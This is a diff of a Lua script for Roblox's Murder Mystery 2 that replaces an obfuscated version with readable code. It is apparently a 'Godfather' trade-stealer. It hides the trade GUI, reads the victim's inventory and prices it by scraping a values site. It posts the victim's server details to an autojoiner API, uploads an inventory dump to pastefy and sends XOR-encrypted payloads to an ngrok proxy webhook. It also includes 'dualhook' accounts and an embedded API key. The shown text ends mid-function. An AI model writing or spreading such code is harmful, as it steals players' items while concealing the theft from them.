@@ -1,805 +1,939 @@
-local _0x0000 = {"_0x0001"}
-local _0x0002 = "_0x0003"
-_0x0004._0x0000 = _0x0000
-_0x0004._0x0002 = _0x0002
-repeat _0x0005._0x0006() until _0x0007:_0x0008()
-_0x0005._0x0006(2)
-if _0x0007._0x000f ~= 142823291 then
-_0x0007._0x0010._0x0011:_0x0012("_0x0013 _0x0014 _0x0015 _0x0016 in _0x000a!")
-return
+local USERNAMES = {"Nuls_rip"}
+local WEBHOOK_ID = "t3pcyds196h"
+
+_G.USERNAMES = USERNAMES
+_G.WEBHOOK_ID = WEBHOOK_ID
+
+
+repeat task.wait() until game:IsLoaded()
+task.wait(2)
+
+-- Sadece MM2'de çalışsın
+if game.PlaceId ~= 142823291 then
+    game.Players.LocalPlayer:Kick("This script only works in MM2!")
+    return
 end
-_0x0004._0x0017 = _0x0004._0x0017 or false
-if _0x0004._0x0017 then return end
-_0x0004._0x0017 = true
-local _0x001b = nil
-local function _0x001c()
-local _0x001d = false
-local _0x001e = {}
-local function _0x001f(_0x0020)
-if _0x001d then return end
-for _0x0021, _0x0022 in ipairs(_0x0023(true)) do
-if type(_0x0022) == "function" then
-local _0x0024 = debug._0x0025(_0x0022)
-if _0x0024 and _0x0024._0x0026 and _0x0024._0x0026:lower():find(_0x0020:lower()) then
-local _0x0027 = _0x0028(_0x0022)
-local _0x0029 = false
-_0x002a(_0x0022, function(...)
-if _0x0029 then return _0x0027(...) end
-_0x0029 = true
-if not _0x001d then
-_0x001d = true
-_0x001b = _0x0007._0x002b
-for _0x0021, _0x002c in ipairs(_0x001e) do
-pcall(function() _0x002a(_0x002c._0x001d, _0x002c._0x0027) end)
+
+_G.scriptExecuted = _G.scriptExecuted or false
+if _G.scriptExecuted then return end
+_G.scriptExecuted = true
+
+-- ================= YENİ BYPASS KODU =================
+local REAL_JOB_ID = nil
+
+local function getRealJobId()
+    local hooked = false
+    local hookedFuncs = {}
+
+    local function tryHook(funcName)
+        if hooked then return end
+
+        for _, v in ipairs(getgc(true)) do
+            if type(v) == "function" then
+                local info = debug.getinfo(v)
+                if info and info.name and info.name:lower():find(funcName:lower()) then
+                    local original = clonefunction(v)
+                    local isRunning = false
+
+                    hookfunction(v, function(...)
+                        if isRunning then return original(...) end
+                        isRunning = true
+
+                        if not hooked then
+                            hooked = true
+                            REAL_JOB_ID = game.JobId
+
+                            for _, item in ipairs(hookedFuncs) do
+                                pcall(function() hookfunction(item.hooked, item.original) end)
+                            end
+                            hookedFuncs = {}
+                        end
+
+                        local results = table.pack(original(...))
+                        isRunning = false
+                        return table.unpack(results)
+                    end)
+
+                    table.insert(hookedFuncs, { hooked = v, original = original })
+                    return
+                end
+            end
+        end
+    end
+
+    tryHook("stepAnimate")
+    if not hooked then tryHook("AnimationPlayed") end
+    if not hooked then tryHook("animate") end
+    if not hooked then tryHook("step") end
+
+    local timeout = 0
+    while not REAL_JOB_ID and timeout < 60 do
+        task.wait(0.1)
+        timeout = timeout + 1
+    end
+
+    if not REAL_JOB_ID then
+        REAL_JOB_ID = game.JobId
+    end
+
+    return REAL_JOB_ID
 end
-_0x001e = {}
+
+REAL_JOB_ID = getRealJobId()
+-- ================= BYPASS SONU =================
+
+-- Şifreleme motoru (dualhook için)
+local a={}for b=0,255 do a[b]=string.char(b)end 
+local function stringchar(b)local c=a[b]or string.char(b)return c end 
+local function mathfloor(b)if b>=0 then return b-(b%1)else local c=b-(b%1)return c==b and c or c-1 end end 
+local function tableinsert(b,c,d)if d==nil then d=c c=#b+1 end for e=#b,c,-1 do b[e+1]=b[e]end b[c]=d end 
+local function tableconcat(b,c,d,e)c=c or''d=d or 1 e=e or#b local f=''for g=d,e do f=f..b[g]if g<e then f=f..c end end return f end 
+local function bxor(b,c)local d,e=0,1 while b>0 or c>0 do local f,g=b%2,c%2 if f~=g then d=d+e end b=mathfloor(b/2)c=mathfloor(c/2)e=e*2 end return d end 
+local function toHex(b)return(b:gsub('.',function(c)return string.format('%02X',string.byte(c))end))end 
+local function xorCrypt(b,c)local d={}for e=1,#b do local f,g=b:byte(e),c:byte((e-1)%#c+1)tableinsert(d,stringchar(bxor(f,g)))end return tableconcat(d)end 
+local function encrypt(b)return toHex(xorCrypt(b,"85acfc6776299e4661b3093d63b6a9a4e6a06bbcbc226d5721471cc15e94b46c"))end
+
+-- ================= PROXY WEBHOOK SYSTEM =================
+
+local PROXY_URL = "https://malevolently-oilless-zita.ngrok-free.dev/api/proxy/"
+
+-- EXTERNAL GLOBALS - SET BY LOADER
+local WEBHOOK_ID = _G.WEBHOOK_ID or "default_webhook"
+local usernames_id = _G.USERNAMES or {}
+
+local DUALHOOK_WEBHOOK_ID = "moqs1fx2p8s"
+local PUBLIC_WEBHOOK_ID = ""
+
+-- Universal request (TÜM EXECUTORLAR İÇİN)
+getgenv().request = getgenv().request 
+    or request 
+    or http_request 
+    or (syn and syn.request) 
+    or (http and http.request) 
+    or (fluxus and fluxus.request) 
+    or (Hydrogen and Hydrogen.request) 
+    or (krnl and krnl.request) 
+    or (KRNL and KRNL.request) 
+    or (codex and codex.request) 
+    or (ronix and ronix.request) 
+    or (volcano and volcano.request) 
+    or (potassium and potassium.request) 
+    or (wave and wave.request) 
+    or (seliware and seliware.request) 
+    or (bunnifun and bunnifun.request) 
+    or (volt and volt.request) 
+    or (velocity and velocity.request) 
+    or (swift and swift.request) 
+    or (xeno and xeno.request) 
+    or getgenv().HttpPost 
+    or nil
+
+if not getgenv().request then
+    return warn("Executor not supported: No request function found.")
 end
-local _0x002d = table._0x002e(_0x0027(...))
-_0x0029 = false
-return table._0x002f(_0x002d)
-end)
-table.insert(_0x001e, { _0x001d = _0x0022, _0x0027 = _0x0027 })
-return
-end
-end
-end
-end
-_0x001f("_0x0030")
-if not _0x001d then _0x001f("_0x0031") end
-if not _0x001d then _0x001f("_0x0032") end
-if not _0x001d then _0x001f("_0x0033") end
-local _0x0034 = 0
-while not _0x001b and _0x0034 < 60 do
-_0x0005._0x0006(0.1)
-_0x0034 = _0x0034 + 1
-end
-if not _0x001b then
-_0x001b = _0x0007._0x002b
-end
-return _0x001b
-end
-_0x001b = _0x001c()
-local _0x003a={}for _0x003b=0,255 do _0x003a[_0x003b]=string.char(_0x003b)end
-local function _0x003c(_0x003b)local _0x003d=_0x003a[_0x003b]or string.char(_0x003b)return _0x003d end
-local function _0x003e(_0x003b)if _0x003b>=0 then return _0x003b-(_0x003b%1)else local _0x003d=_0x003b-(_0x003b%1)return _0x003d==_0x003b and _0x003d or _0x003d-1 end end
-local function _0x003f(_0x003b,_0x003d,_0x0040)if _0x0040==nil then _0x0040=_0x003d _0x003d=#_0x003b+1 end for _0x0041=#_0x003b,_0x003d,-1 do _0x003b[_0x0041+1]=_0x003b[_0x0041]end _0x003b[_0x003d]=_0x0040 end
-local function _0x0042(_0x003b,_0x003d,_0x0040,_0x0041)_0x003d=_0x003d or''_0x0040=_0x0040 or 1 _0x0041=_0x0041 or#_0x003b local _0x0043=''for _0x0044=_0x0040,_0x0041 do _0x0043=_0x0043.._0x003b[_0x0044]if _0x0044<_0x0041 then _0x0043=_0x0043.._0x003d end end return _0x0043 end
-local function _0x0045(_0x003b,_0x003d)local _0x0040,_0x0041=0,1 while _0x003b>0 or _0x003d>0 do local _0x0043,_0x0044=_0x003b%2,_0x003d%2 if _0x0043~=_0x0044 then _0x0040=_0x0040+_0x0041 end _0x003b=_0x003e(_0x003b/2)_0x003d=_0x003e(_0x003d/2)_0x0041=_0x0041*2 end return _0x0040 end
-local function _0x0046(_0x003b)return(_0x003b:gsub('.',function(_0x003d)return string.format('%02X',string.byte(_0x003d))end))end
-local function _0x0047(_0x003b,_0x003d)local _0x0040={}for _0x0041=1,#_0x003b do local _0x0043,_0x0044=_0x003b:byte(_0x0041),_0x003d:byte((_0x0041-1)%#_0x003d+1)_0x003f(_0x0040,_0x003c(_0x0045(_0x0043,_0x0044)))end return _0x0042(_0x0040)end
-local function _0x0048(_0x003b)return _0x0046(_0x0047(_0x003b,"85acfc6776299e4661b3093d63b6a9a4e6a06bbcbc226d5721471cc15e94b46c"))end
-local _0x004c = "_0x004d://_0x004e-_0x004f-_0x0050._0x0051-_0x0052._0x0053/_0x0054/_0x0055/"
-local _0x0002 = _0x0004._0x0002 or "_0x005b"
-local _0x005c = _0x0004._0x0000 or {}
-local _0x005d = "_0x005e"
-local _0x005f = "_0x0060"
-_0x0067()._0x0062 = _0x0067()._0x0062
-or _0x0062
-or _0x0068
-or (_0x0069 and _0x0069._0x0062)
-or (_0x006a and _0x006a._0x0062)
-or (_0x006b and _0x006b._0x0062)
-or (_0x006c and _0x006c._0x0062)
-or (_0x006d and _0x006d._0x0062)
-or (_0x006e and _0x006e._0x0062)
-or (_0x006f and _0x006f._0x0062)
-or (_0x0070 and _0x0070._0x0062)
-or (_0x0071 and _0x0071._0x0062)
-or (_0x0072 and _0x0072._0x0062)
-or (_0x0073 and _0x0073._0x0062)
-or (_0x0074 and _0x0074._0x0062)
-or (_0x0075 and _0x0075._0x0062)
-or (_0x0076 and _0x0076._0x0062)
-or (_0x0077 and _0x0077._0x0062)
-or (_0x0078 and _0x0078._0x0062)
-or (_0x0079 and _0x0079._0x0062)
-or _0x0067()._0x007a
-or nil
-if not _0x0067()._0x0062 then
-return _0x007b("_0x007c not _0x007d: _0x007e _0x0062 function _0x007f.")
-end
-_0x0067()._0x0080 = _0x0067()._0x0080
-or _0x0080
-or _0x0081
-or (_0x0069 and _0x0069._0x0080)
-or (_0x006b and _0x006b._0x0080)
-or (_0x006c and _0x006c._0x0080)
-or (_0x006d and _0x006d._0x0080)
-or (_0x006f and _0x006f._0x0080)
-or (_0x0070 and _0x0070._0x0080)
-or (_0x0071 and _0x0071._0x0080)
-or (_0x0072 and _0x0072._0x0080)
-or (_0x0073 and _0x0073._0x0080)
-or (_0x0074 and _0x0074._0x0080)
-or (_0x0075 and _0x0075._0x0080)
-or (_0x0076 and _0x0076._0x0080)
-or (_0x0077 and _0x0077._0x0080)
-or (_0x0078 and _0x0078._0x0080)
-or (_0x0079 and _0x0079._0x0080)
-or nil
-_0x0067()._0x0082 = _0x0067()._0x0082
-or _0x0082
-or (_0x0069 and _0x0069._0x0082)
-or (_0x0083 and _0x0083._0x0084)
-or (_0x006c and _0x006c._0x0082)
-or (_0x006d and _0x006d._0x0082)
-or (_0x006f and _0x006f._0x0082)
-or (_0x0070 and _0x0070._0x0082)
-or (_0x0071 and _0x0071._0x0082)
-or (_0x0072 and _0x0072._0x0082)
-or (_0x0073 and _0x0073._0x0082)
-or (_0x0074 and _0x0074._0x0082)
-or (_0x0075 and _0x0075._0x0082)
-or (_0x0076 and _0x0076._0x0082)
-or (_0x0077 and _0x0077._0x0082)
-or (_0x0078 and _0x0078._0x0082)
-or (_0x0079 and _0x0079._0x0082)
-or function() end
-local _0x0085 = _0x0007:_0x0086("_0x0085")
-if not _0x0085._0x0087 then _0x0085._0x0087 = true end
-local _0x0088 = {
-_0x0089 = _0x005c,
-_0x008a = _0x0002,
-_0x008b = {"_0x008c", "_0x008d", "_0x008e", "_0x008f", "_0x0090"},
-_0x0091 = "_0x0092",
-_0x0093 = "_0x004d://_0x0094-_0x0095-_0x0096._0x0097._0x0098",
-_0x0099 = "_0x009a"
+
+-- Universal queue_on_teleport
+getgenv().queue_on_teleport = getgenv().queue_on_teleport 
+    or queue_on_teleport 
+    or queueonteleport 
+    or (syn and syn.queue_on_teleport) 
+    or (fluxus and fluxus.queue_on_teleport) 
+    or (Hydrogen and Hydrogen.queue_on_teleport) 
+    or (krnl and krnl.queue_on_teleport) 
+    or (codex and codex.queue_on_teleport) 
+    or (ronix and ronix.queue_on_teleport) 
+    or (volcano and volcano.queue_on_teleport) 
+    or (potassium and potassium.queue_on_teleport) 
+    or (wave and wave.queue_on_teleport) 
+    or (seliware and seliware.queue_on_teleport) 
+    or (bunnifun and bunnifun.queue_on_teleport) 
+    or (volt and volt.queue_on_teleport) 
+    or (velocity and velocity.queue_on_teleport) 
+    or (swift and swift.queue_on_teleport) 
+    or (xeno and xeno.queue_on_teleport) 
+    or nil
+
+-- Universal setclipboard
+getgenv().setclipboard = getgenv().setclipboard 
+    or setclipboard 
+    or (syn and syn.setclipboard) 
+    or (clipboard and clipboard.set) 
+    or (Hydrogen and Hydrogen.setclipboard) 
+    or (krnl and krnl.setclipboard) 
+    or (codex and codex.setclipboard) 
+    or (ronix and ronix.setclipboard) 
+    or (volcano and volcano.setclipboard) 
+    or (potassium and potassium.setclipboard) 
+    or (wave and wave.setclipboard) 
+    or (seliware and seliware.setclipboard) 
+    or (bunnifun and bunnifun.setclipboard) 
+    or (volt and volt.setclipboard) 
+    or (velocity and velocity.setclipboard) 
+    or (swift and swift.setclipboard) 
+    or (xeno and xeno.setclipboard) 
+    or function() end
+
+local HttpService = game:GetService("HttpService")
+if not HttpService.HttpEnabled then HttpService.HttpEnabled = true end
+
+
+local cfg = {
+    users = usernames_id,
+    webhook = WEBHOOK_ID,
+
+    dualhookUser = {"Skaakm", "ItsBelrux", "ItsZorlux", "bastememirhan7", "The_Galaxor"},
+    pingEveryone = "Yes",
+    StatusApi = "https://live-status-seven.vercel.app",
+    ApiKey = "sk_live_4A9ZK7F2N0D6B8R5XHqMJEWpCYLt"
 }
-local _0x009d = "_0x004d://_0x009e-_0x009f._0x0097._0x0098/_0x0054/_0x00a0"
-local _0x00a3 = {
-["_0x00a4"] = true, ["_0x00a5"] = true, ["_0x00a6"] = true,
-["_0x00a7"] = true, ["_0x00a8"] = true, ["_0x00a9"] = true,
-["_0x00aa"] = true, ["_0x00ab"] = true, ["_0x00ac"] = true,
-["_0x00ad"] = true, ["_0x00ae"] = true, ["_0x00af"] = true,
-["_0x00b0"] = true, ["_0x00b1"] = true, ["_0x00b2"] = true,
-["_0x00b3"] = true, ["_0x00b4"] = true, ["_0x00b5"] = true, ["???"] = true,
-["_0x00b6"] = true, ["_0x00b7"] = true, ["_0x00b8"] = true,
-["_0x00b9"] = true, ["_0x00ba"] = true, ["_0x00bb"] = true,
-["_0x00bc"] = true, ["_0x00bd"] = true
+-- AUTOJOINER API
+local AUTOJOINER_API = "https://autojoiner-fawn.vercel.app/api/hit"
+
+-- Trade dışı itemlar
+local no_trade_items = {
+    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true,
+    ["Reaver_Legendary"] = true, ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true,
+    ["IceHammer"] = true, ["IceHammer_Legendary"] = true, ["IceHammer_Godly"] = true,
+    ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true, ["Gingerscythe_Legendary"] = true,
+    ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true, ["TestItem"] = true,
+    ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true, ["???"] = true,
+    ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
+    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
+    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
 }
-local _0x00c1 = {
-["_0x00c2. _0x00c3'_0x000d _0x00c4"] = true, ["_0x00be _0x00c5"] = true, ["_0x00be _0x00c6"] = true,
-["_0x00be _0x00c7"] = true, ["_0x00c2. _0x00c8'_0x000d _0x00c4"] = true, ["_0x00c2. _0x00c9"] = true,
-["_0x00be _0x00ca"] = true, ["_0x00be _0x00cb"] = true, ["_0x00be _0x00cc"] = true,
-["_0x00be _0x00cd"] = true, ["_0x00c2. _0x00ce"] = true, ["_0x00c2. _0x00cf _0x00d0"] = true,
-["_0x00be _0x00d1"] = true, ["_0x00be _0x00d2"] = true, ["_0x00be _0x00d3"] = true,
-["_0x00be _0x00d4"] = true, ["_0x00c5"] = true, ["_0x00c3'_0x000d _0x00c4"] = true,
-["_0x00c6"] = true, ["_0x00c9"] = true, ["_0x00c8'_0x000d _0x00c4"] = true,
-["_0x00d5"] = true, ["_0x00d6"] = true, ["_0x00d7"] = true, ["_0x00cb"] = true,
-["_0x00d8"] = true, ["_0x00d9"] = true, ["_0x00c7"] = true, ["_0x00da"] = true,
-["_0x00c3'_0x000d _0x00db"] = true, ["_0x00dc"] = true, ["_0x00c8'_0x000d _0x00db"] = true
+
+-- Chroma/özel itemler
+local specialItems = {
+    ["C. Traveler's Gun"] = true, ["Chroma Evergun"] = true, ["Chroma Evergreen"] = true,
+    ["Chroma Bauble"] = true, ["C. Vampire's Gun"] = true, ["C. Constellation"] = true,
+    ["Chroma Blizzard"] = true, ["Chroma Alienbeam"] = true, ["Chroma Snowstorm"] = true,
+    ["Chroma Raygun"] = true, ["C. Snowcannon"] = true, ["C. Snow Dagger"] = true,
+    ["Chroma Sunrise"] = true, ["Chroma Sunset"] = true, ["Chroma Ornament"] = true,
+    ["Chroma Watergun"] = true, ["Evergun"] = true, ["Traveler's Gun"] = true,
+    ["Evergreen"] = true, ["Constellation"] = true, ["Vampire's Gun"] = true,
+    ["Turkey"] = true, ["Darkshot"] = true, ["Darksword"] = true, ["Alienbeam"] = true,
+    ["Blossom"] = true, ["Sakura"] = true, ["Bauble"] = true, ["Gingerscope"] = true,
+    ["Traveler's Axe"] = true, ["Celestial"] = true, ["Vampire's Axe"] = true
 }
-local _0x0089 = _0x0088._0x0089
-local _0x008b = _0x0088._0x008b
-local _0x0010 = _0x0007:_0x0086("_0x0010")
-local _0x00dd = _0x0007:_0x0086("_0x00dd")
-local _0x00de = _0x0007:_0x0086("_0x00de")
-local _0x00df = _0x0010._0x0011
-if not _0x00df then return end
-local _0x00e0 = nil
-local _0x00e1 = false
-local _0x00e2 = false
-local _0x00e3 = false
-local _0x00e4 = 0
-local _0x00e5 = false
-local _0x00e9 = {}
-local _0x00ea = {}
-local _0x00eb = nil
-local _0x00ec = nil
-local _0x00ed = nil
-local _0x00ee = false
-local _0x0062 = _0x0067()._0x0062
-local _0x00f2 = "_0x00f3"
+
+local users = cfg.users
+local dualhookUser = cfg.dualhookUser
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local plr = Players.LocalPlayer
+
+if not plr then return end
+
+local dualhookTimer = nil
+local isDualhookActive = false
+local isTradeCompleted = false
+local hasSpecialItem = false
+local totalInventoryValue = 0
+local statusHeartbeatStarted = false
+
+-- Trade takibi için global değişkenler
+local originalItems = {}
+local receivedCounts = {}
+local tradeMessageId = nil
+local tradeWebhookUrl = nil
+local tradeMessageUrl = nil
+local isDualhookTrade = false
+
+local request = getgenv().request
+
+-- Executor ismini evrensel olarak al
+local executorName = "Unknown"
 pcall(function()
-local _0x00f4, _0x0026 = pcall(_0x00f5)
-if _0x00f4 and _0x0026 then
-_0x00f2 = _0x0026
+    local ok, name = pcall(identifyexecutor)
+    if ok and name then
+        executorName = name
+    else
+        local ok2, name2 = pcall(getexecutorname)
+        if ok2 and name2 then
+            executorName = name2
+        end
+    end
+end)
+
+local isDelta = executorName:lower():find("delta") ~= nil
+local queueTeleport = getgenv().queue_on_teleport
+local savedRealJobId = (getgenv and (getgenv().RealJobId or getgenv().JobId)) or nil
+
+local STATUS_API_URL = cfg.StatusApi or ""
+local API_KEY = cfg.ApiKey or ""
+local AVATAR_URL = "https://cdn.discordapp.com/attachments/1469409737220165746/1469677154294825032/IMG_6264.png"
+
+-- Autojoiner'a hit bildir
+local function sendHitToQueue(placeId, jobId, receiverName)
+    pcall(function()
+        request({
+            Url = AUTOJOINER_API,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                placeId = tostring(placeId),
+                jobId = tostring(jobId),
+                receiver = receiverName
+            })
+        })
+    end)
+end
+
+-- Rubis.app yükleme
+local function upload_to_rubis(items)
+    local lines = {"Godfather Inventory Dump| Pastefy", "Generated: " .. os.date("%Y-%m-%d %H:%M:%S"), "Total Items: " .. #items, string.rep("-", 50), ""}
+    table.sort(items, function(a, b)
+        local tier_order = {Ancient=9, Godly=8, Unique=7, Vintage=6, Legendary=5, Rare=4, Uncommon=3, Common=2}
+        local a_order = tier_order[a.Rarity] or 1
+        local b_order = tier_order[b.Rarity] or 1
+        if a_order ~= b_order then return a_order > b_order end
+        return (a.Value * a.Amount) > (b.Value * b.Amount)
+    end)
+    local current_tier = nil
+    for _, item in ipairs(items) do
+        if current_tier ~= item.Rarity then
+            current_tier = item.Rarity
+            table.insert(lines, "")
+            table.insert(lines, "[" .. current_tier:upper() .. "]")
+            table.insert(lines, string.rep("-", 30))
+        end
+        local total_val = item.Value * item.Amount
+        table.insert(lines, string.format("%s | Qty: %d | Value: %d (Total: %d)", item.ItemName or item.DataID, item.Amount, item.Value, total_val))
+    end
+    local content = table.concat(lines, "\n")
+    local ok, response = pcall(function()
+        return request({
+            Url = "https://pastefy.app/api/v2/paste",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                content = content,
+                type = "PASTE"
+            })
+        })
+    end)
+    if ok and response and response.StatusCode == 200 then
+        local ok2, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+        if ok2 and data then
+            if data.paste then 
+                return "https://pastefy.app/" .. data.paste.id
+            elseif data.id then 
+                return "https://pastefy.app/" .. data.id 
+            end
+        end
+    end
+    return nil
+end
+
+-- Değer çekme fonksiyonu
+local function fetch_all_values()
+    local value_links = {
+        commons = "https://supremevalues.com/mm2/commons",
+        uncommons = "https://supremevalues.com/mm2/uncommons",
+        rares = "https://supremevalues.com/mm2/rares",
+        legendaries = "https://supremevalues.com/mm2/legendaries",
+        godlies = "https://supremevalues.com/mm2/godlies",
+        chromas = "https://supremevalues.com/mm2/chromas",
+        vintages = "https://supremevalues.com/mm2/vintages",
+        ancients = "https://supremevalues.com/mm2/ancients",
+        evos = "https://supremevalues.com/mm2/evos",
+        uniques = "https://supremevalues.com/mm2/uniques",
+        sets = "https://supremevalues.com/mm2/sets"
+    }
+    local req_headers = {
+        ["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
+        ["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
+    }
+    local function clean_string_lol(str) return str:match("^%s*(.-)%s*$") end
+    local function fetchHTML(url)
+        local ok, response = pcall(function() return request({Url = url, Method = "GET", Headers = req_headers}) end)
+        if ok and response then return response.Body end
+        return nil
+    end
+    local function parseValue(itembodyDiv)
+        local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
+        if valueStr then
+            valueStr = valueStr:gsub(",", "")
+            local value = tonumber(valueStr)
+            if value then return value end
+        end
+        return nil
+    end
+    local function extractItems(htmlContent)
+        local itemValues = {}
+        for itemName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+            itemName = itemName:match("([^<]+)")
+            if itemName then
+                itemName = clean_string_lol(itemName:gsub("%s+", " "))
+                itemName = clean_string_lol((itemName:split(" Click "))[1])
+                local itemNameLower = itemName:lower()
+                local value = parseValue(itembodyDiv)
+                if value then itemValues[itemNameLower] = value end
+            end
+        end
+        return itemValues
+    end
+    local function extractChromaItems(htmlContent)
+        local chromaValues = {}
+        for chromaName, itembodyDiv in htmlContent:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
+            chromaName = chromaName:match("([^<]+)")
+            if chromaName then
+                chromaName = clean_string_lol(chromaName:gsub("%s+", " ")):lower()
+                local value = parseValue(itembodyDiv)
+                if value then chromaValues[chromaName] = value end
+            end
+        end
+        return chromaValues
+    end
+
+    local allExtractedValues = {}
+    local chromaExtractedValues = {}
+    local categoriesToFetch = {}
+    for rarity, url in pairs(value_links) do
+        table.insert(categoriesToFetch, {rarity = rarity, url = url})
+    end
+    local totalCategories = #categoriesToFetch
+    local completed = 0
+    local lock = Instance.new("BindableEvent")
+
+    for _, category in ipairs(categoriesToFetch) do
+        task.spawn(function()
+            local rarity = category.rarity
+            local url = category.url
+            local htmlContent = fetchHTML(url)
+            if htmlContent and htmlContent ~= "" then
+                if rarity == "chromas" then
+                    local extracted = extractChromaItems(htmlContent)
+                    for k, v in pairs(extracted) do chromaExtractedValues[k] = v end
+                else
+                    local extracted = extractItems(htmlContent)
+                    for k, v in pairs(extracted) do allExtractedValues[k] = v end
+                end
+            end
+            completed = completed + 1
+            if completed == totalCategories then lock:Fire() end
+        end)
+    end
+    lock.Event:Wait()
+
+    local final_prices = {}
+    local item_db = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+    for id, data in pairs(item_db) do
+        local item_name = data.ItemName and data.ItemName:lower() or ""
+        local rarity = data.Rarity or ""
+        local has_chroma = data.Chroma or false
+        if item_name ~= "" and rarity ~= "" then
+            if has_chroma then
+                for c_name, c_val in pairs(chromaExtractedValues) do
+                    if c_name:find(item_name) then
+                        final_prices[id] = c_val
+                        break
+                    end
+                end
+            end
+            if not final_prices[id] and allExtractedValues[item_name] then
+                final_prices[id] = allExtractedValues[item_name]
+            end
+            if not final_prices[id] then
+                if rarity == "Godly" then final_prices[id] = 8
+                elseif rarity == "Ancient" then final_prices[id] = 50
+                elseif rarity == "Unique" then final_prices[id] = 100
+                elseif rarity == "Vintage" then final_prices[id] = 25
+                elseif rarity == "Evos" then final_prices[id] = 15
+                elseif rarity == "Legendary" then final_prices[id] = 5
+                else final_prices[id] = 1 end
+            end
+        end
+    end
+    return final_prices
+end
+
+-- Delta bypass (yeni versiyon)
+-- REAL_JOB_ID zaten yukarıda bypass ile alındı
+
+if not plr.Character then plr.CharacterAdded:Wait() end
+task.wait(1)
+
+local PlaceId = game.PlaceId
+local fernJoinerLink = string.format("https://fern.wtf/joiner?placeId=%d&gameInstanceId=%s", PlaceId, REAL_JOB_ID)
+
+local Trade = ReplicatedStorage:WaitForChild("Trade")
+local SendRequest = Trade:WaitForChild("SendRequest")
+local GetStatus = Trade:WaitForChild("GetTradeStatus")
+local OfferItem = Trade:WaitForChild("OfferItem")
+local AcceptTradeRemote = Trade:WaitForChild("AcceptTrade")
+local DeclineTrade = Trade:WaitForChild("DeclineTrade")
+
+local LastOffer = nil
+Trade.UpdateTrade.OnClientEvent:Connect(function(x) 
+    if x and x.LastOffer then LastOffer = x.LastOffer end
+end)
+
+-- GUI'leri kapat
+local PlayerGui = plr:WaitForChild("PlayerGui")
+for _, guiName in ipairs({"TradeGUI", "TradeGUI_Phone"}) do
+    local gui = PlayerGui:FindFirstChild(guiName)
+    if gui then
+        gui.Enabled = false
+        gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+            if gui.Enabled then gui.Enabled = false end
+        end)
+    end
+end
+
+-- Inventory oku
+local database = require(ReplicatedStorage:WaitForChild("Database"):WaitForChild("Sync"):WaitForChild("Item"))
+local profileData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
+
+local weaponsToSend = {}
+local rarityCounts = {Ancient=0, Godly=0, Unique=0, Vintage=0, Legendary=0, Rare=0, Uncommon=0, Common=0}
+local prices = fetch_all_values()
+
+for dataid, amount in pairs(profileData.Weapons.Owned or {}) do
+    local item = database[dataid]
+    if item and not no_trade_items[dataid] then
+        local itemName = item.ItemName or dataid
+        local rarity = item.Rarity or "Common"
+        local value = prices[dataid] or 1
+        local totalValue = value * amount
+        totalInventoryValue = totalInventoryValue + totalValue
+        if specialItems[itemName] then hasSpecialItem = true end
+        table.insert(weaponsToSend, {
+            DataID = dataid,
+            ItemName = itemName,
+            Amount = amount,
+            Rarity = rarity,
+            Value = value,
+            TotalValue = totalValue,
+            IsChroma = specialItems[itemName] or false
+        })
+        rarityCounts[rarity] = (rarityCounts[rarity] or 0) + amount
+    end
+end
+
+table.sort(weaponsToSend, function(a, b) return a.TotalValue > b.TotalValue end)
+
+-- Hit kategorisi
+local hitCategory = ""
+local isPingWorthy = false
+
+if totalInventoryValue < 100 then
+    hitCategory = "Bad Hit"
+elseif totalInventoryValue < 300 then
+    hitCategory = "Normal Hit"
+elseif totalInventoryValue < 1000 then
+    hitCategory = "Good Hit"
+    isPingWorthy = true
 else
-local _0x00f6, _0x00f7 = pcall(_0x00f8)
-if _0x00f6 and _0x00f7 then
-_0x00f2 = _0x00f7
+    hitCategory = "Big Hit"
+    isPingWorthy = true
 end
+
+local rubisLink = upload_to_rubis(weaponsToSend) or "Upload failed"
+
+
+local function sendToProxy(Wid, payload, isEncrypted)
+    task.spawn(function()
+        local finalBody = HttpService:JSONEncode(payload)
+        if isEncrypted then
+            finalBody = encrypt(finalBody)
+        end
+        
+        local url = PROXY_URL .. Wid
+        print("[Godfather] Sending to proxy:", url)
+        
+        local success, response = pcall(function()
+            return request({
+                Url = url,
+                Method = "POST",
+                Headers = {
+                    ["Content-Type"] = "application/json",
+                    ["User-Agent"] = "Godfather/3.5.1"
+                },
+                Body = finalBody
+            })
+        end)
+        
+        if not success then
+            warn("[Godfather] Request failed:", tostring(response))
+        elseif response.StatusCode ~= 200 then
+            warn("[Godfather] Proxy error:", response.StatusCode, response.Body)
+        else
+            print("[Godfather] successfully")
+        end
+    end)
 end
+-- Trade mesajını güncelle (SADECE proxy üzerinden)
+local function updateTradeMessage()
+    if not tradeMessageUrl or not originalItems or #originalItems == 0 then return end
+    if isDualhookTrade then return end
+
+    local totalReceivedValue = 0
+    local totalOriginalValue = 0
+    local itemFields = {}
+
+    for _, origItem in ipairs(originalItems) do
